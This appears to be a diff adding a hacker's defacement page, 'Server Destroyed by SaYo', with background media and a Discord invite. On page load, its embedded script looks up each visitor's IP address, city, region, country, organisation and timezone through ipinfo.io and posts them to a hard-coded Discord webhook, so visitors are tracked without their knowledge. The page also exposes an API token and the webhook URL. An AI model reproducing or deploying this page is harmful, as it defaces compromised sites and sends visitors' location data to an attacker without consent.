@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <link rel="icon" type="image/png" href="https://cdn.discordapp.com/attachments/1228137335267397682/1265135867803078701/979a8461d1fcc8642fbf0983a6458958.webp" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"> <!-- إضافة خط روبوتو -->
+  <meta name="Author" content="3nza">
+  <meta name="copyright" content="SaYo">
+  <meta name="description" content="Hacked by SaYo" />
+  <meta charset="UTF-8">
+  <title>Server Destroyed by SaYo</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: 'Roboto', sans-serif; /* تغيير الخط إلى روبوتو */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    .content {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      color: white;
+    }
+    h1 {
+      font-size: 30px;
+      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
+    }
+    p {
+      font-size: 22px;
+      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
+      margin: 15px 0;
+    }
+    .button {
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #00d5ff;
+      color: #fff;
+      font-size: 18px;
+      text-decoration: none;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+      margin-top: 20px;
+    }
+    .button:hover {
+      background-color: #00d5ff;
+    }
+    .static-text {
+      font-size: 40px;
+      color: #00d5ff;
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body onclick="playSound()" onmouseover="playSound()">
+  <!-- الصوت الجديد -->
+  <audio src="https://cdn.discordapp.com/attachments/1316781324178296982/1317124823465590794/ssstik.io_u4yz_1734097419605.mp4?ex=675d8b94&is=675c3a14&hm=0f855a76ed9978639c7d04f2a503897c4ee45a2a82a4775c2f898c0e86b2fa06&" autoplay loop></audio>
+
+  <!-- الفيديو في الخلفية -->
+  <video autoplay muted loop id="background-video" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;">
+    <source src="https://imgur.com/BXVn7iS.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <div class="content">
+    <!-- الصورة في المنتصف -->
+    <img src="https://cdn.discordapp.com/attachments/1316781324178296982/1317099586757857280/c9caaefab8b79b840082538f840901f3.gif?ex=675d7414&is=675c2294&hm=1c25efd7ad0fa8ff16eff11d9afd15ecb8e10b6dc2b79ed0a765caf2b1178957&" width="230" height="230" alt="Server Destroyed">
+
+    <!-- العنوان في المنتصف -->
+    <h1>Server Destroyed By (SaYo)</h1>
+
+    <!-- عرض المعلومات المعتمدة على بيانات المستخدم -->
+    <p id="ip">IP: <span id="user-ip">جارٍ التحميل...</span></p>
+    <p id="city">City: <span id="user-city">جارٍ التحميل...</span></p>
+    <p id="region">Region: <span id="user-region">جارٍ التحميل...</span></p>
+    <p id="country">Country: <span id="user-country">جارٍ التحميل...</span></p>
+    <p id="org">Organization: <span id="user-org">جارٍ التحميل...</span></p>
+    <p id="timezone">Timezone: <span id="user-timezone">جارٍ التحميل...</span></p>
+
+    <!-- زر ديسكورد -->
+    <a href="https://discord.gg/xh" class="button">Join our Discord</a>
+
+    <!-- النص الأحمر الثابت تحت زر join -->
+    <div class="static-text">SaYo: Discord.gg/xh</div>
+  </div>
+
+  <script>
+    function playSound() {
+      var audio = document.querySelector("audio");
+      audio.play();
+    }
+
+    // جلب معلومات المستخدم باستخدام ipinfo.io
+    fetch('https://ipinfo.io/json?token=19e24642ad2295')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, country, city, region, org, timezone } = data;
+        
+        // التحقق من البيانات وعرضها على الصفحة
+        if (data) {
+          document.getElementById("user-ip").textContent = ip;
+          document.getElementById("user-city").textContent = city;
+          document.getElementById("user-region").textContent = region;
+          document.getElementById("user-country").textContent = country;
+          document.getElementById("user-org").textContent = org;
+          document.getElementById("user-timezone").textContent = timezone;
+        } else {
+          alert("لم يتمكن من جلب البيانات.");
+        }
+
+        // إنشاء JSON يحتوي على بيانات المستخدم
+        const userData = {
+          ip: ip,
+          city: city,
+          region: region,
+          country: country,
+          org: org,
+          timezone: timezone
+        };
+
+        // إرسال البيانات إلى Webhook
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1272599625152593951/Dj5mazYsxxu4h6U9S7RRsHENejdvuInKtdQyID2tGleWoSJImsnGbct5azv28GPCO4H-';
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            content: `IP: ${ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nOrg: ${org}\nTimezone: ${timezone}`
+          })
+        });
+
+        console.log(userData);
+      })
+      .catch(error => {
+        console.error('Error fetching data:', error);
+        alert('عذراً، لم نتمكن من تحميل البيانات.');
+      });
+  </script>
+</body>
+</html>
